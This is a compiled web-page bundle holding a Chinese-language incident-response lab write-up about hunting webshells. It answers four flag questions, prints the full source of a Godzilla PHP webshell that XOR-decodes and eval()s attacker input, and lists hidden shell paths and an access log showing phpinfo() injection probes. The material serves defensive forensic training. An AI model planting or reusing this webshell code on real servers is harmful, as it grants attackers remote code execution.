"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[6427],{87911:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>d,contentTitle:()=>s,default:()=>o,frontMatter:()=>t,metadata:()=>c,toc:()=>p});var i=a(85893),l=a(11151);const t={},s="\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - webshell \u67e5\u6740",c={id:"Xuanji/Unit-1/25",title:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - webshell \u67e5\u6740",description:"1",source:"@site/docs/Xuanji/Unit-1/25.md",sourceDirName:"Xuanji/Unit-1",slug:"/Xuanji/Unit-1/25",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-1/25",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Xuanji/Unit-1/25.md",tags:[],version:"current",frontMatter:{},sidebar:"Xuanji_Sidebar",previous:{title:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94-Linux\u65e5\u5fd7\u5206\u6790",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-1/24"},next:{title:"\u7b2c\u4e8c\u7ae0\u65e5\u5fd7\u5206\u6790-apache\u65e5\u5fd7\u5206\u6790",permalink:"/Target-Machines-WriteUp/docs/Xuanji/Unit-2/29"}},d={},p=[{value:"1",id:"1",level:2},{value:"2",id:"2",level:2},{value:"3",id:"3",level:2},{value:"4",id:"4",level:2}];function r(e){const n={blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",img:"img",p:"p",pre:"pre",...(0,l.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"\u7b2c\u4e00\u7ae0-\u5e94\u6025\u54cd\u5e94---webshell-\u67e5\u6740",children:"\u7b2c\u4e00\u7ae0 \u5e94\u6025\u54cd\u5e94 - webshell \u67e5\u6740"}),"\n",(0,i.jsx)(n.h2,{id:"1",children:"1"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u9ed1\u5ba2 webshell \u91cc\u9762\u7684 flag"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u5c06\u7f51\u7ad9\u6e90\u7801\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u5206\u6790"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:a(96802).Z+"",width:"1267",height:"872"})}),"\n",(0,i.jsx)(n.p,{children:"\u67e5\u770b\u76f8\u5173\u6587\u4ef6\uff0c\u53d1\u73b0"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-php",metastring:'title="/var/www/html/include/gz.php"',children:'<?php\n@session_start();\n@set_time_limit(0);\n@error_reporting(0);\nfunction encode($D,$K){\n    for($i=0;$i<strlen($D);$i++) {\n        $c = $K[$i+1&15];\n        $D[$i] = $D[$i]^$c;\n    }\n    return $D;\n}\n//027ccd04-5065-48b6-a32d-77c704a5e26d\n$payloadName=\'payload\';\n$key=\'3c6e0b8a9c15224a\';\n$data=file_get_contents("php://input");\nif ($data!==false){\n    $data=encode($data,$key);\n    if (isset($_SESSION[$payloadName])){\n        $payload=encode($_SESSION[$payloadName],$key);\n        if (strpos($payload,"getBasicsInfo")===false){\n            $payload=encode($payload,$key);\n        }\n                eval($payload);\n        echo encode(@run($data),$key);\n    }else{\n        if (strpos($data,"getBasicsInfo")!==false){\n            $_SESSION[$payloadName]=encode($data,$key);\n        }\n    }\n}\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"flag{027ccd04-5065-48b6-a32d-77c704a5e26d}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"2",children:"2"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u9ed1\u5ba2\u4f7f\u7528\u7684\u4ec0\u4e48\u5de5\u5177\u7684 shell github \u5730\u5740\u7684 md5"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"/var/www/html/include/gz.php \u6587\u4ef6\u4e3a\u54e5\u65af\u62c9\u7684 webshell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"https://github.com/BeichenDream/Godzilla --\x3e 39392de3218c333f794befef07ac9257\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"flag{39392de3218c333f794befef07ac9257}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"3",children:"3"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u9ed1\u5ba2\u9690\u85cf shell \u7684\u5b8c\u6574\u8def\u5f84\u7684 md5"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"/var/www/html/include/Db/.Mysqli.php --\x3e aebac0e58cd6c5fad1695ee4d1ac1919\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"flag{aebac0e58cd6c5fad1695ee4d1ac1919}\n"})}),"\n",(0,i.jsx)(n.h2,{id:"4",children:"4"}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"\u9ed1\u5ba2\u514d\u6740\u9a6c\u5b8c\u6574\u8def\u5f84 md5"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"\u67e5\u770b access.log \u5373\u53ef"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) root@ip-10-0-10-2:/var/www/html/include/Db# cat /var/log/apache2/access.log | awk '{print $7}' | uniq\n......\n/shell.php\n/wap/index.php?1=phpinfo();\n/wap/template/images/mobile.css\n/wap/template/images/time.gif\n/wap/template/images/logo.gif\n/wap/index.php?1=phpinfo();\n/shell.php\n/wap/index.php?1=phpinfo();\n/shell.php\n/wap/top.php?1=phpinfo();\n/shell.php\n/wap/top.php?fuc=ERsDHgEUC1hI&func2=ser\n/wap/top.php?fuc=ERsDHgEUC1hI&func2=sert\n/shell.php\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"/var/www/html/wap/top.php --\x3e eeff2eabfd9b7a6d26fc1a53d3f7d1de\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}\n"})})]})}function o(e={}){const{wrapper:n}={...(0,l.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(r,{...e})}):r(e)}},96802:(e,n,a)=>{a.d(n,{Z:()=>i});const i=a.p+"assets/images/image_20240429-222939-82e59538ec0300058a0e77a5b013bf3e.png"},11151:(e,n,a)=>{a.d(n,{Z:()=>c,a:()=>s});var i=a(67294);const l={},t=i.createContext(l);function s(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:s(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);